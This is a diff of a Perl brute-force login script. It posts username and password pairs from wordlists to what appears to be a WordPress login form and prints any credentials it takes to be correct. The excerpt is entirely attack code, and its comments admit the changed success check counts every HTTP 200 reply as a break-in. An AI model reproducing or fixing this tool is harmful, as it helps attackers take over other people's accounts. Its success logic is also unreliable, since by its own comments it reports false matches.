@@ -131,19 +131,19 @@ sub brute_force {
   print "++++++++++++++++++++++++++++++++++\n";
   print color('reset');
   #Iterating through the two arrays to try and guess the username and password
-  #It sort of does what it is supposed too
   foreach (@users) {
     chomp(my $user = $_);
     foreach (@passwds) {
       chomp(my $passwd = $_);
       my $login = $bot-> post($target, log => $user, pwd => $passwd);
-      unless ($login->content !~ m/Error/g){
+      #still does not work, it will count all of the requests as success since it returns status code 200.
+      #have to get the filter correct to determine the correct username/password combo
+      if ($login -> is_success){
         print color('green');
         print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
         print color('reset');
         print "++++++++++++++++++++++++++++++++++\n";
       }
-    return;
     }
   }
 }
